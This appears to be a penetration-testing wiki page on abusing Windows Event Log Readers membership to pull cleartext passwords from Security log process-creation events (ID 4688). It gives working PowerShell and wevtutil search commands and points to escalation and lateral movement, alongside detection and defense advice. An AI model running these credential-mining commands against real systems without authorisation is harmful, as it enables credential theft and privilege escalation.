# Event Log Readers

**Event Log Readers** can read the Windows **Security** event log — which does not grant SYSTEM directly, but is a rich, frequently-overlooked **credential source**. When command-line process-creation auditing (Event ID 4688) is enabled, every process launch is logged *with its full command line*. Administrators and scripts routinely pass passwords on the command line (`net use`, `runas`, scheduled-task setup, installers), so a member of this group can mine the log for cleartext credentials and then escalate with those.

## Confirm membership

```cmd
whoami /groups | findstr /i "Event Log Readers"
```

## Exploitation — mine command lines for credentials

Search 4688 events for password-like arguments:

```powershell
Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4688]]" |
  Where-Object { $_.Message -match '/pass|/user|password|-p ' } |
  Select-Object -First 50 -Expand Message
```

`wevtutil` alternative (no admin needed with group membership):

```cmd
wevtutil qe Security /q:"*[System[(EventID=4688)]]" /f:text /c:200 | findstr /i "password /user /pass"
```

Recovered credentials feed [Escalation via RunAs](../Escalation-via-RunAs.md), Pass The Hash Attack, or lateral movement.

## Detection and defenses

- **Detection:** bulk Security-log reads by a non-admin, `wevtutil`/`Get-WinEvent` queries filtering for password strings.
- **Defenses:** minimise Event Log Readers membership; **never pass secrets on the command line**; forward and restrict access to Security logs; disable command-line auditing exposure where the risk outweighs the benefit, or protect the logs.

## Related
- [Windows Built in Groups](Windows-Built-in-Groups.md) — group overview and escalation map
- [Password Mining](../Password-Mining/Password-Mining.md) — other credential-discovery techniques
- [Escalation via RunAs](../Escalation-via-RunAs.md) — use recovered credentials to elevate
- Pass The Hash Attack — use recovered hashes directly
